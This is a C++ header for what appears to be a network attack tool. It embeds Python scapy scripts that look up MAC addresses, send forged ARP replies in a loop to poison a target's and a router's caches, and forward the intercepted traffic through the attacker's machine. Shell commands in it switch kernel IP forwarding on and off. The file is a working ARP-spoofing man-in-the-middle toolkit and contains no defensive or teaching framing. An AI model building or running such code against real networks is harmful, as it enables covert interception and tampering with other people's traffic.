#pragma once
#include <string>
using namespace std;

struct pythonProcessData;
struct SeshionData;

// backend Functions for process controll
void getCode(pythonProcessData& data);
void runCode(pythonProcessData& data);


// Utility funtions for frontend integration
int startTestPythonCode(SeshionData& seshData, bool await = false);
int getMacAddress(SeshionData& seshData, string ip, bool await = false);
int startArpSpoof(SeshionData& seshData, string targetIp, string targetMac, string routerIp, string routerMac, string iface, bool await = false);
int startForward(SeshionData& seshData, string iface, string ip_target, string mac_target, string mac_self, string mac_router, bool await = false);
int enableForward(SeshionData& seshData, string iface, bool await = false);
int disableForward(SeshionData& seshData, string iface, bool await = false);


// Python codes to be executed
const string testPythonCode = R"(
print('hey1')
print('hey2')
print('hey')
import time
time.sleep(5)
)";

const string getMacAddressCode = R"(
from scapy.all import ARP, Ether, sr
import logging
from getmac import get_mac_address as gma
def get_mac(ip):
        if ip == 'self':
                return gma()
        ans, _ = sr(ARP(op=1, pdst=ip), timeout=2, verbose=False)
        for _, rcv in ans:
                return rcv.hwsrc
        return None
print(f'{get_mac(IP_TARGET)}', end='')
)";

const string startArpSpoofCode = R"(
from scapy.all import ARP, Ether, send
import time, sys, os

def spoof(target_ip, target_mac, spoof_ip, IFACE):
	packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	send(packet, verbose=False, iface=IFACE)

try:
	print('starting spoof')
	while True:
		spoof(TARGET_IP, TARGET_MAC, ROUTER_IP, IFACE)
		spoof(ROUTER_IP, ROUTER_MAC, TARGET_IP, IFACE)
		time.sleep(1)
except KeyboardInterrupt:
	print("\n[INFO] Exiting...")
	sys.exit(0)
except Exception as e:
	print(f"[ERROR] {e}")
	sys.exit(1)
)";

const string startForwardCode = R"(
from scapy.all import sendp, sniff, Ether, IP

def forward_packet(packet):
	if packet[Ether].src == MAC_TARGET:
		packet[Ether].src = MAC_SELF
		packet[Ether].dst = MAC_ROUTER
	elif packet[Ether].src == MAC_ROUTER and packet.has_layer(IP):
		if packet[IP].dst == IP_TARGET:
			packet[Ether].src = MAC_SELF
			packet[Ether].dst = MAC_TARGET
		else:
			return
	else:
		return
	sendp(packet, iface=IFACE, verbose=False)

sniff(iface=IFACE, prn=forward_packet, filter='ether src {} or ether src {}'.format(MAC_TARGET, MAC_ROUTER), store=0)
)";

const string allowForwardCode = R"(
import subprocess

command = 'echo 1 > /proc/sys/net/ipv4/ip_forward'
subprocess.run(command, shell=True, check=True)
)";
const string dissableForwardCode = R"(
import subprocess

command = 'echo 0 > /proc/sys/net/ipv4/ip_forward'
subprocess.run(command, shell=True, check=True)
)";